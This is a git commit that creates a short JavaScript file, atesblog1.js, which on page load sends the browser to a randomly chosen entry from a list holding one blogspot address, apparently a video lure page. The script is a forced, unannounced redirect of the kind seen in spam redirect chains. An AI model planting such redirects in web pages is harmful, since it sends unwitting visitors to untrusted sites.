4f7dfa6f419053dd313090251266c7c7bbf51ddb
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2025-07-16 10:17:20 +0700

    Create atesblog1.js

---
+++ atesblog1.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://playvideooterbaruu1.blogspot.com/',
+
+  'https://playvideooterbaruu1.blogspot.com/',
+
+  'https://playvideooterbaruu1.blogspot.com/'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
